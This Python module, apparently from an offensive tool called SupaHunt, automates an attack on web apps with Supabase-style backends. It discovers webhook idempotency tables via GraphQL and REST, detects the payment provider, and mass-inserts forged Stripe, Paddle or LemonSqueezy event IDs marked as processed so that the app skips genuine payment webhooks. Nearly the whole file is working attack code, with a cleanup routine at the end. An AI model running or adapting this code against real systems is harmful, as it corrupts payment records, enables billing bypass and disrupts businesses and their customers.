"""
SupaHunt — Webhook Idempotency Poisoner
Auto-discovers webhook/event tracking tables and pre-inserts fake
event IDs to cause the app to skip real payment webhooks.

Supports Stripe, Paddle, LemonSqueezy, and generic webhook patterns.
"""

import json
import time
import secrets
import string
from typing import Optional
from .base import BaseModule


# Payment provider event ID formats
EVENT_ID_GENERATORS = {
    "stripe": lambda: f"evt_{''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(24))}",
    "paddle": lambda: f"evt_{''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(32))}",
    "lemonsqueezy": lambda: f"{''.join(secrets.choice(string.digits) for _ in range(10))}",
    "generic": lambda: f"evt-{secrets.token_hex(16)}",
}

# Payment provider event types
PROVIDER_EVENT_TYPES = {
    "stripe": [
        # Payment
        "checkout.session.completed", "checkout.session.expired",
        "payment_intent.succeeded", "payment_intent.payment_failed",
        "payment_intent.canceled", "payment_intent.created",
        # Subscriptions
        "customer.subscription.created", "customer.subscription.updated",
        "customer.subscription.deleted", "customer.subscription.paused",
        "customer.subscription.resumed", "customer.subscription.trial_will_end",
        # Invoices
        "invoice.paid", "invoice.payment_failed",
        "invoice.payment_action_required", "invoice.finalized",
        "invoice.upcoming", "invoice.created",
        # Charges
        "charge.succeeded", "charge.failed", "charge.refunded",
        "charge.dispute.created", "charge.dispute.closed",
        # Customer
        "customer.created", "customer.updated", "customer.deleted",
        # Payment methods
        "payment_method.attached", "payment_method.detached",
        # Setup
        "setup_intent.succeeded", "setup_intent.setup_failed",
        # Billing portal
        "billing_portal.session.created",
        # Prices/Products
        "price.created", "price.updated",
        "product.created", "product.updated",
    ],
    "paddle": [
        "subscription.created", "subscription.updated", "subscription.canceled",
        "subscription.activated", "subscription.paused", "subscription.resumed",
        "transaction.completed", "transaction.payment_failed",
        "customer.created", "customer.updated",
    ],
    "lemonsqueezy": [
        "order_created", "subscription_created", "subscription_updated",
        "subscription_cancelled", "subscription_payment_success",
        "subscription_payment_failed", "license_key_created",
    ],
}

# Keywords to identify webhook/event tables
WEBHOOK_TABLE_KEYWORDS = [
    "webhook", "event", "payment_event", "stripe", "paddle",
    "processed", "idempotent", "lemon",
]


class WebhookPoisoner(BaseModule):
    """
    Auto-discovers and poisons webhook idempotency tables.
    Adapts to any payment provider (Stripe, Paddle, LemonSqueezy, etc).
    """

    def __init__(self, target, console=None, timeout: int = 15,
                 proxy: str = None, **kwargs):
        super().__init__(target, console=console, timeout=timeout,
                         proxy=proxy, **kwargs)
        self._found_tables = []
        self._injected_ids = []
        self._provider = "stripe"  # auto-detected

    def find_webhook_tables(self, token: str = None) -> list:
        """Auto-discover webhook/event tables via GraphQL + REST probing."""
        # Method 1: GraphQL introspection
        query = """{__schema{queryType{fields{name}}}}"""
        result = self.graphql_query(query, token)
        fields = (
            (result.get("data") or {})
            .get("__schema", {})
            .get("queryType", {})
            .get("fields", [])
        )

        candidates = []
        for f in fields:
            name = f["name"].replace("Collection", "")
            name_lower = name.lower()
            if any(kw in name_lower for kw in WEBHOOK_TABLE_KEYWORDS):
                candidates.append(name)

        # Method 2: verify via REST
        for table in candidates:
            r = self.get(
                f"{self.rest_url(table)}?select=id&limit=1",
                token=token,
                extra_headers={"Prefer": "count=exact", "Range": "0-0"},
            )
            if r and r.status_code in (200, 206, 416):
                self._found_tables.append(table)
                self.log_critical(f"Webhook table found: {table}")

                cr = r.headers.get("Content-Range", "")
                if "/" in cr:
                    try:
                        count = int(cr.split("/")[1])
                        self.log_info(f"  Existing records: {count}")
                    except (ValueError, IndexError):
                        pass

        if not self._found_tables:
            self.log_fail("No webhook tables found")

        return self._found_tables

    # Keep legacy single-table API
    def find_webhook_table(self, token: str = None) -> Optional[str]:
        if not self._found_tables:
            self.find_webhook_tables(token)
        return self._found_tables[0] if self._found_tables else None

    def detect_provider(self, table: str, token: str = None) -> str:
        """Auto-detect payment provider from existing table data."""
        r = self.get(
            f"{self.rest_url(table)}?select=*&limit=5",
            token=token,
        )
        if r and r.status_code == 200:
            try:
                data = r.json()
                text = json.dumps(data).lower()
                if "stripe" in text or "evt_" in text:
                    self._provider = "stripe"
                elif "paddle" in text:
                    self._provider = "paddle"
                elif "lemon" in text:
                    self._provider = "lemonsqueezy"
                self.log_info(f"Detected provider: {self._provider}")
            except Exception:
                pass
        return self._provider

    def get_table_schema(self, token: str = None) -> list:
        """Get columns of the webhook table via GraphQL introspection."""
        table = self._found_tables[0] if self._found_tables else None
        if not table:
            return []

        type_name = f"{table}InsertInput"
        query = f"""
        {{
            __type(name: "{type_name}") {{
                inputFields {{
                    name
                    type {{
                        name kind
                        ofType {{ name kind }}
                    }}
                }}
            }}
        }}
        """
        result = self.graphql_query(query, token)
        t = (result.get("data") or {}).get("__type")
        fields = t.get("inputFields", []) if t else []
        if fields:
            self.log_info(f"Schema: {[f['name'] for f in fields]}")
        return fields

    def _build_event_object(self, schema: list, event_id: str,
                            event_type: str) -> dict:
        """
        Build an insert object from schema, mapping event_id and
        event_type to whichever columns the table uses.
        """
        obj = {}
        field_names = [f["name"] for f in schema]

        # Map event_id
        for candidate in ["event_id", "stripe_event_id", "webhook_id",
                           "idempotency_key", "external_id", "id_external"]:
            if candidate in field_names:
                obj[candidate] = event_id
                break

        # Map event_type
        for candidate in ["event_type", "type", "webhook_type", "event_name"]:
            if candidate in field_names:
                obj[candidate] = event_type
                break

        # Map timestamp
        for candidate in ["processed_at", "created_at", "received_at",
                           "timestamp", "event_timestamp"]:
            if candidate in field_names:
                obj[candidate] = "2099-01-01T00:00:00Z"
                break

        # Map status
        for candidate in ["status", "state"]:
            if candidate in field_names:
                obj[candidate] = "processed"
                break

        return obj

    def poison_via_graphql(self, events_per_type: int = 100,
                           token: str = None, batch_size: int = 10,
                           provider: str = None) -> dict:
        """Mass-inject fake event IDs via GraphQL INSERT."""
        if not self._found_tables:
            return {"success": False, "error": "No table found"}

        table = self._found_tables[0]
        provider = provider or self._provider

        # Get schema for field mapping
        schema = self.get_table_schema(token)
        event_types = PROVIDER_EVENT_TYPES.get(provider,
                                               PROVIDER_EVENT_TYPES["stripe"])
        gen_id = EVENT_ID_GENERATORS.get(provider,
                                         EVENT_ID_GENERATORS["generic"])

        total_injected = 0
        errors = 0
        results = {"events": [], "total": 0, "errors": 0}

        self.log_info(
            f"Poisoning {len(event_types)} event types "
            f"x {events_per_type} = {len(event_types) * events_per_type} "
            f"events ({provider})"
        )

        for event_type in event_types:
            type_events = []
            for _ in range(events_per_type):
                eid = gen_id()
                type_events.append({"event_id": eid, "event_type": event_type})

            for i in range(0, len(type_events), batch_size):
                batch = type_events[i:i + batch_size]
                objects = []
                for evt in batch:
                    if schema:
                        obj = self._build_event_object(
                            schema, evt["event_id"], evt["event_type"]
                        )
                    else:
                        obj = {
                            "event_id": evt["event_id"],
                            "event_type": evt["event_type"],
                            "processed_at": "2099-01-01T00:00:00Z",
                        }

                    parts = []
                    for k, v in obj.items():
                        parts.append(f'{k}:"{v}"')
                    objects.append("{" + ",".join(parts) + "}")

                obj_str = ",".join(objects)
                mutation = (
                    f'mutation{{insertInto{table}Collection('
                    f'objects:[{obj_str}])'
                    f'{{affectedCount records{{id}}}}}}'
                )

                resp = self.graphql_mutation(mutation, token)
                data = (resp.get("data") or {}).get(
                    f"insertInto{table}Collection", {}
                )

                if data and data.get("affectedCount", 0) > 0:
                    count = data["affectedCount"]
                    total_injected += count
                    records = data.get("records", [])
                    for r in records:
                        self._injected_ids.append(r.get("id"))
                else:
                    errs = resp.get("errors", [])
                    if errs:
                        errors += 1
                        if errors <= 3:
                            self.log_warn(
                                f"Batch error on {event_type}: "
                                f"{errs[0].get('message', '')[:100]}"
                            )

            self.log_info(
                f"  {event_type}: {events_per_type} events "
                f"(total: {total_injected})"
            )

        results["total"] = total_injected
        results["errors"] = errors
        results["event_types"] = len(event_types)
        results["provider"] = provider

        if total_injected > 0:
            self.log_critical(
                f"Injected {total_injected} fake {provider} webhook events "
                f"across {len(event_types)} event types!"
            )

        return results

    def poison_via_rest(self, events_per_type: int = 50,
                        token: str = None,
                        provider: str = None) -> dict:
        """Fallback: inject via REST POST if GraphQL fails."""
        if not self._found_tables:
            return {"success": False, "error": "No table found"}

        table = self._found_tables[0]
        provider = provider or self._provider
        event_types = PROVIDER_EVENT_TYPES.get(provider,
                                               PROVIDER_EVENT_TYPES["stripe"])
        gen_id = EVENT_ID_GENERATORS.get(provider,
                                         EVENT_ID_GENERATORS["generic"])

        total = 0
        for event_type in event_types:
            for _ in range(events_per_type):
                event_id = gen_id()
                r = self.post(
                    self.rest_url(table),
                    token=token,
                    json_data={
                        "event_id": event_id,
                        "event_type": event_type,
                        "processed_at": "2099-01-01T00:00:00Z",
                    },
                    prefer="return=minimal",
                )
                if r and r.status_code == 201:
                    total += 1
                    self._injected_ids.append(event_id)

        self.log_critical(f"REST injection: {total} {provider} events inserted")
        return {"total": total, "method": "rest", "provider": provider}

    def verify_poisoning(self, token: str = None) -> dict:
        """Check how many records are in the table."""
        if not self._found_tables:
            return {}

        table = self._found_tables[0]
        r = self.get(
            f"{self.rest_url(table)}?select=id&limit=0",
            token=token,
            extra_headers={"Prefer": "count=exact", "Range": "0-0"},
        )
        count = 0
        if r:
            cr = r.headers.get("Content-Range", "")
            if "/" in cr:
                try:
                    count = int(cr.split("/")[1])
                except (ValueError, IndexError):
                    pass

        self.log_info(f"Total records in {table}: {count}")
        return {"table": table, "total_records": count}

    def cleanup(self, token: str = None) -> int:
        """Remove all injected records."""
        if not self._found_tables:
            return 0

        table = self._found_tables[0]
        cleaned = 0
        for record_id in self._injected_ids:
            mutation = (
                f'mutation{{deleteFrom{table}Collection('
                f'filter:{{id:{{eq:"{record_id}"}}}}'
                f'){{affectedCount}}}}'
            )
            resp = self.graphql_mutation(mutation, token)
            affected = (
                (resp.get("data") or {})
                .get(f"deleteFrom{table}Collection", {})
                .get("affectedCount", 0)
            )
            cleaned += affected

        self.log_info(f"Cleaned up {cleaned}/{len(self._injected_ids)} records")
        return cleaned
